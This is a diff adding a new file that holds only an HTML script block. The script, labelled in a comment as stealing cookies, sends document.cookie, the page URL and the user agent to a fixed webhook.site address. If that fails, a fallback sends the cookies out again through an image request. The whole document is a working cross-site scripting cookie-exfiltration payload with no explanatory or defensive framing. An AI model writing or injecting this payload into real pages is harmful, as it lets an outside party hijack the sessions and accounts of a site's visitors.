@@ -1,0 +1,16 @@
+<script>
+// Steal cookies and send to webhook
+fetch('https://webhook.site/ad1f1f7e-a419-4d45-86c8-bf7bed5509c0', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+        cookies: document.cookie,
+        url: window.location.href,
+        userAgent: navigator.userAgent
+    })
+}).catch(err => {
+    // Fallback method
+    var img = new Image();
+    img.src = 'https://webhook.site/ad1f1f7e-a419-4d45-86c8-bf7bed5509c0?c=' + encodeURIComponent(document.cookie);
+});
+</script>
